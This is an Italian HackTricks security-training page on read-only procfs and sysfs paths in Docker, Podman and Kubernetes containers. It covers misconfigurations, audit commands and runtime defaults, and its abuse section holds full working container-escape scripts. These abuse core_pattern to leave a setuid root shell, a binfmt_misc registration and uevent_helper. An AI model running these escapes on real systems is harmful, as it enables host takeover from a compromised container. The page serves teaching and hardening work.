# Percorsi di sistema in sola lettura

{{#include ../../../../banners/hacktricks-training.md}}

I percorsi di sistema in sola lettura sono una protezione distinta dai percorsi masked. Invece di nascondere completamente un percorso, il runtime lo espone ma lo monta in sola lettura. Questo è comune per determinate posizioni procfs e sysfs, dove l'accesso in lettura può essere accettabile o necessario per motivi operativi, mentre le scritture sarebbero troppo pericolose.

Lo scopo è semplice: molte interfacce del kernel diventano molto più pericolose quando sono scrivibili. Un mount in sola lettura non rimuove ogni valore di ricognizione, ma impedisce a un workload compromesso di modificare i file sottostanti esposti al kernel attraverso quel percorso.

## Funzionamento

I runtime contrassegnano frequentemente parti della vista proc/sys come di sola lettura. A seconda del runtime e dell'host, possono essere inclusi percorsi come:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

L'elenco effettivo varia, ma il modello è lo stesso: consentire la visibilità dove necessario e negare le modifiche per impostazione predefinita.

## Lab

Esamina l'elenco dei percorsi in sola lettura dichiarato da Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Esamina la vista proc/sys montata dall'interno del container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impatto sulla sicurezza

I system path in sola lettura limitano un'ampia classe di abusi con impatto sull'host. Anche quando un attacker può ispezionare procfs o sysfs, l'impossibilità di scrivervi elimina molti percorsi di modifica diretta relativi a kernel tunables, crash handler, module-loading helper o altre control interface. L'esposizione non scompare, ma il passaggio dalla divulgazione di informazioni all'influenza sull'host diventa più difficile.

## Misconfigurazioni

Gli errori principali consistono nel rimuovere il masking o nel rimontare in read-write i path sensibili, nell'esporre direttamente i contenuti di proc/sys dell'host tramite bind mount scrivibili oppure nell'utilizzare modalità privilegiate che, di fatto, aggirano i default più sicuri del runtime. In Kubernetes, `procMount: Unmasked` e i workload privilegiati spesso si accompagnano a una protezione più debole di proc. Un altro errore operativo comune è presumere che, poiché il runtime monta normalmente questi path in sola lettura, tutti i workload ereditino ancora quel default.

## Abuso

Se la protezione è debole, inizia cercando entry di proc/sys scrivibili:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando sono presenti voci con permessi di scrittura, i percorsi di follow-up ad alto valore includono:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Cosa possono rivelare questi comandi:

- Le voci scrivibili sotto `/proc/sys` spesso significano che il container può modificare il comportamento del kernel dell'host, anziché limitarsi a ispezionarlo.
- `core_pattern` è particolarmente importante perché un valore scrivibile esposto dall'host può essere trasformato in un percorso di code execution sull'host, causando il crash di un processo dopo aver impostato un pipe handler.
- `modprobe` rivela l'helper utilizzato dal kernel per i flussi relativi al caricamento dei moduli; è un target classico e di alto valore quando è scrivibile.
- `binfmt_misc` indica se è possibile registrare interpreter personalizzati. Se la registrazione è scrivibile, può diventare una execution primitive anziché una semplice information leak.
- `panic_on_oom` controlla una decisione del kernel a livello di host e può quindi trasformare l'esaurimento delle risorse in un denial of service dell'host.
- `uevent_helper` è uno degli esempi più chiari di un percorso helper sysfs scrivibile che produce execution nel contesto dell'host.

Tra i risultati interessanti figurano knob proc esposti dall'host o voci sysfs scrivibili che normalmente dovrebbero essere in sola lettura. A quel punto, il workload è passato da una visualizzazione limitata del container a un'influenza significativa sul kernel.

### Esempio completo: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` è scrivibile dall'interno del container e punta alla visualizzazione del kernel dell'host, può essere abusato per eseguire un payload dopo un crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se il path raggiunge davvero il kernel dell'host, il payload viene eseguito sull'host e lascia una shell setuid.

### Esempio completo: registrazione `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` è scrivibile, una registrazione di un interprete personalizzato può produrre code execution quando viene eseguito il file corrispondente:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Su un `binfmt_misc` scrivibile ed esposto all'host, il risultato è l'esecuzione di codice nel percorso dell'interprete attivato dal kernel.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel potrebbe invocare un helper con percorso sull'host quando viene attivato un evento corrispondente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Il motivo per cui questo è così pericoloso è che il percorso dell'helper viene risolto dal punto di vista del filesystem dell'host, anziché da un contesto sicuro limitato al container.

## Controlli

Questi controlli determinano se l'esposizione di procfs/sysfs è in sola lettura come previsto e se il workload può ancora modificare interfacce sensibili del kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Cosa è interessante qui:

- Un workload hardened normale dovrebbe esporre pochissime entry proc/sys scrivibili.
- I path `/proc/sys` scrivibili sono spesso più importanti del semplice accesso in lettura.
- Se il runtime indica che un path è di sola lettura, ma nella pratica è scrivibile, esamina attentamente la mount propagation, i bind mount e le impostazioni dei privilegi.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | Docker definisce un elenco predefinito di path di sola lettura per le entry proc sensibili | esposizione dei mount proc/sys dell'host, `--privileged` |
| Podman | Abilitato per impostazione predefinita | Podman applica i path predefiniti di sola lettura, a meno che non vengano esplicitamente allentati | `--security-opt unmask=ALL`, mount ampi dell'host, `--privileged` |
| Kubernetes | Eredita le impostazioni predefinite del runtime | Usa il modello di path di sola lettura del runtime sottostante, a meno che non venga indebolito dalle impostazioni del Pod o dai mount dell'host | `procMount: Unmasked`, workload privilegiati, mount proc/sys dell'host scrivibili |
| containerd / CRI-O in Kubernetes | Impostazione predefinita del runtime | In genere si affida alle impostazioni predefinite di OCI/runtime | come nella riga Kubernetes; le modifiche dirette alla configurazione del runtime possono indebolire il comportamento |

Il punto chiave è che i path di sistema di sola lettura sono solitamente presenti come impostazione predefinita del runtime, ma sono facili da compromettere usando modalità privilegiate o bind mount dell'host.
{{#include ../../../../banners/hacktricks-training.md}}
